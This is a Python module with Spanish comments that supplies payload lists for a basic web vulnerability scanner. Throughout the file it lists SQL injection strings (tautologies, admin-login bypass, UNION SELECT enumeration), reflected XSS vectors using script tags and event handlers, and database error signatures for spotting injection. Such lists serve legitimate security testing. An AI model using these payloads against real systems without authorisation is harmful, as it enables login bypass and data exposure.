"""Colecciones de payloads para escaneo básico.

NOTA: Estos payloads son educativos y genéricos; no exhaustivos.
Se han agrupado por categorías para facilitar futuras ampliaciones.
"""

# Payloads SQL Injection (reflejada / error based)
# Categorías: comillas simples, tautologías, union-based, order by, enumeración simple, variaciones de comentarios
SQLI_PAYLOADS = [
    # Comillas simples / ruptura de sintaxis
    "'",
    "' '",
    "''",
    "'--",
    "'-- -",
    "' #",
    "'/*",
    # Tautologías básicas
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "1 OR 1=1",
    "1' OR '1'='1",
    '" OR "1"="1',
    # Clausuras de paréntesis
    "') OR ('1'='1",
    "') OR ('a'='a",
    # Variaciones de admin bypass
    "admin' --",
    "admin' #",
    # Union based (longitudes cortas para no romper)
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    # Order / group
    "' ORDER BY 1--",
    "' ORDER BY 2--",
    # AND comparaciones
    "' AND '1'='1",
    "' AND 1=1--",
    # Intento de enumeración tabla típica (simple)
    "' UNION SELECT user(),database()--",
]

# Payloads XSS reflejado (sin necesidad de ejecutar JS complejo)
# Categorías: script tags, atributos onerror/onload, SVG, inyección de cierre, eventos, vectores alternativos
XSS_PAYLOADS = [
    # Script directo
    "<script>alert('xss')</script>",
    "<script>alert(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    # Cierre de atributo / tag breakouts
    "\"><script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    '"/><svg/onload=alert(1)>',
    # Eventos comunes
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=confirm(1)>",
    "<body onload=alert(1)>",
    # SVG
    "<svg/onload=alert(1)>",
    "<svg><script>alert(1)</script>",
    # Iframe / object
    "<iframe src=javascript:alert(1)></iframe>",
    "<object data=javascript:alert(1)>",
    # Encapsulado en enlaces
    "<a href=javascript:alert(1)>click</a>",
    # Detalles / eventos HTML5
    "<details open ontoggle=alert(1)>",
    # Estilo / animación
    "<div style=animation-name:spin onanimationstart=alert(1)></div>",
    # Mouse events (requiere interacción pero se registra reflejo)
    '" onmouseover=alert(1) x="',
]

# Firmas de error comunes multi-motor (MySQL, MSSQL, Oracle, PostgreSQL, SQLite)
ERROR_SIGNATURES = [
    'you have an error in your sql syntax',
    'warning: mysql',
    'mysql_fetch',
    'unclosed quotation mark after the character string',
    'quoted string not properly terminated',
    'sql syntax error',
    'syntax error at or near',
    'org.postgresql.util.psqlexception',
    'sqlite error',
    'sqlite3::sqlexception',
    'ora-00933',
    'ora-00936',
    'ora-01756',
    'odbc sql server driver',
    'microsoft ole db provider',
]

# Garantizar unicidad (por si se edita manualmente más tarde)
SQLI_PAYLOADS = list(dict.fromkeys(SQLI_PAYLOADS))
XSS_PAYLOADS = list(dict.fromkeys(XSS_PAYLOADS))
